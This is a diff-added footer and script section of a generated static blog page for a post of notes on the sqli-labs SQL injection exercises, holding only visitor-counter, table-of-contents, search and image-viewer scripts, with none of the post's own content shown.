+  <div class="statistics">
+    
+    
+    <i class="iconfont icon-users"></i>
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      <i class="iconfont icon-friends"></i>
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+    
+      
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-codeforces"></i>
+        全站共计:31.9k 字
+      </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer>
+  (function () {
+    // 查询存储的记录
+    function getRecord(Counter, target) {
+      return new Promise(function (resolve, reject) {
+        Counter('get', '/classes/Counter?where=' + encodeURIComponent(JSON.stringify({target})))
+          .then(resp => resp.json())
+          .then(({results, code, error}) => {
+            if (code === 401) {
+              throw error;
+            }
+            if (results && results.length > 0) {
+              var record = results[0];
+              resolve(record);
+            } else {
+              Counter('post', '/classes/Counter', {target, time: 0})
+                .then(resp => resp.json())
+                .then((record, error) => {
+                  if (error) {
+                    throw error;
+                  }
+                  resolve(record);
+                }).catch(error => {
+                console.error('Failed to create', error);
+                reject(error);
+              });
+            }
+          }).catch((error) => {
+          console.error('LeanCloud Counter Error:', error);
+          reject(error);
+        });
+      })
+    }
+
+    // 发起自增请求
+    function increment(Counter, incrArr) {
+      return new Promise(function (resolve, reject) {
+        Counter('post', '/batch', {
+          "requests": incrArr
+        }).then((res) => {
+          res = res.json();
+          if (res.error) {
+            throw res.error;
+          }
+          resolve(res);
+        }).catch((error) => {
+          console.error('Failed to save visitor count', error);
+          reject(error);
+        });
+      });
+    }
+
+    // 构建自增请求体
+    function buildIncrement(objectId) {
+      return {
+        "method": "PUT",
+        "path": `/1.1/classes/Counter/${ objectId }`,
+        "body": {
+          "time": {
+            '__op': 'Increment',
+            'amount': 1
+          }
+        }
+      }
+    }
+
+    // 校验是否为有效的 UV
+    function validUV() {
+      var key = 'LeanCloud_UV_Flag';
+      var flag = localStorage.getItem(key);
+      if (flag) {
+        // 距离标记小于 24 小时则不计为 UV
+        if (new Date().getTime() - parseInt(flag) <= 86400000) {
+          return false;
+        }
+      }
+      localStorage.setItem(key, new Date().getTime().toString());
+      return true;
+    }
+
+    function addCount(Counter) {
+      var enableIncr = 'true' === 'true' && window.location.hostname !== 'localhost';
+      var getterArr = [];
+      var incrArr = [];
+
+      // 请求 PV 并自增
+      var pvCtn = document.querySelector('#leancloud-site-pv-container');
+      if (pvCtn || enableIncr) {
+        var pvGetter = getRecord(Counter, 'site-pv').then((record) => {
+          incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-pv');
+          if (ele) {
+            ele.innerText = record.time + 1;
+            if (pvCtn) {
+              pvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(pvGetter);
+      }
+
+      // 请求 UV 并自增
+      var uvCtn = document.querySelector('#leancloud-site-uv-container');
+      if (uvCtn || enableIncr) {
+        var uvGetter = getRecord(Counter, 'site-uv').then((record) => {
+          var vuv = validUV();
+          vuv && incrArr.push(buildIncrement(record.objectId))
+          var ele = document.querySelector('#leancloud-site-uv');
+          if (ele) {
+            ele.innerText = record.time + (vuv ? 1 : 0);
+            if (uvCtn) {
+              uvCtn.style.display = 'inline';
+            }
+          }
+        });
+        getterArr.push(uvGetter);
+      }
+
+      // 如果是文章，请求文章的浏览数，并自增
+      if ('true' === 'true') {
+        var viewCtn = document.querySelector('#leancloud-post-views-container');
+        if (viewCtn || enableIncr) {
+          var target = decodeURI('/2018/07/20/sqli-labs1/');
+          var viewGetter = getRecord(Counter, target).then((record) => {
+            incrArr.push(buildIncrement(record.objectId))
+            if (viewCtn) {
+              var ele = document.querySelector('#leancloud-post-views');
+              if (ele) {
+                ele.innerText = (record.time || 0) + 1;
+                viewCtn.style.display = 'inline';
+              }
+            }
+          });
+          getterArr.push(viewGetter);
+        }
+      }
+
+      // 如果启动计数自增，批量发起自增请求
+      if (enableIncr) {
+        Promise.all(getterArr).then(() => {
+          incrArr.length > 0 && increment(Counter, incrArr);
+        })
+      }
+    }
+
+    var app_id = '3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz'
+    var app_key = 'neatHwvRMvcDYnNxMBbGGFlP'
+    var server_url = 'https://3vytx5qf.lc-cn-n1-shared.com'
+
+    function fetchData(api_server) {
+      var Counter = (method, url, data) => {
+        return fetch(`${ api_server }/1.1${ url }`, {
+          method,
+          headers: {
+            'X-LC-Id': app_id,
+            'X-LC-Key': app_key,
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+
+      addCount(Counter);
+    }
+
+    var api_server = app_id.slice(-9) !== '-MdYXbMMI' ? server_url : `https://${ app_id.slice(0, 8).toLowerCase() }.api.lncldglobal.com`;
+
+    if (api_server) {
+      fetchData(api_server);
+    } else {
+      fetch('https://app-router.leancloud.cn/2/route?appId=' + app_id)
+        .then(resp => resp.json())
+        .then(({api_server}) => {
+          fetchData('https://' + api_server);
+        });
+    }
+  })();
+</script>
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    function typing(id, hitokoto){
+      var typed = new Typed('#' + id, {
+        strings: [
+          '  ',
+          hitokoto + "&nbsp;",
+        ],
+        cursorChar: "_",
+        typeSpeed: 70,
+        loop: false,
+      });
+      typed.stop();
+      $(document).ready(function () {
+        $(".typed-cursor").addClass("h2");
+        typed.start();
+      });
+    };
+      
+  
+    typing("subtitle", "sqli-labs的学习记录一（1-8）")
+  
+  </script>
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
